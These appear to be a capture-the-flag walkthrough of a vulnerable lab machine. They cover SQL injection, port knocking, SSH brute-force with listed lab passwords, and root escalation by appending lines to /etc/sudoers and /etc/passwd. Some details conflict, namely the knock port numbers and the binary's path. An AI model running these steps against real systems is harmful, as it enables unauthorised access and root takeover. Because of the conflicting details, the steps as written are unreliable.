port 80 open. port 22 filtered

there's a sqli in port 80, which gives a list of usernames and passwords from the database.
then we also discover there's a port-knocking protocol in place
`/etc/knockd.conf` shows we need to first hit 7469, 8475, 9843 to open ssh port
```sh
for x in 7469 8475 9842; do
	nmap -Pn --host-timeout 201 --max-retries 0 -p $x $IP;
done
```
This opens up ssh, and can be verified using
`nmap -Pn -p22 $IP`
now, ssh brute-force using the list we discovered earlier
we get hits on
chandlerb : UrAG0D!
joeyt : Passw0rd
janitor : Ilovepeepee

ssh as janitor
in the home, a hidden file shows a new bunch of passwords
When we brute-force ssh, we get new hit
fredf : B4-Tru3-001
fredf!

---
`sudo -l` shows we can run `/opt/devstuff/dist/test/test` as root
This is a binary of test.py, which basically reads a file and appends it to another file
```python
import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

Since we can use append a file to another as sudo, it means we can append a file to /etc/passwd or /etc/sudoers
so, first we prepare a file with the intended line that gives us root, and we use the test binary to append it to /etc/sudoers or /etc/passwd.
```zsh
echo "$(whoami) ALL=(ALL:ALL) ALL" > temp_file
chmod 777 temp_file 
sudo /opt/devstuff/dist/build/build temp_file /etc/sudoers
sudo su

#Alternatively, we can alo add a new user with root privs and add them to /etc/passwd
echo "root2:$(openssl passwd w00t):0:0:root:/root:/bin/bash" > temp_file
sudo /opt/devstuff/dist/build/build temp_file /etc/passwd
sudo root2
#w00t
```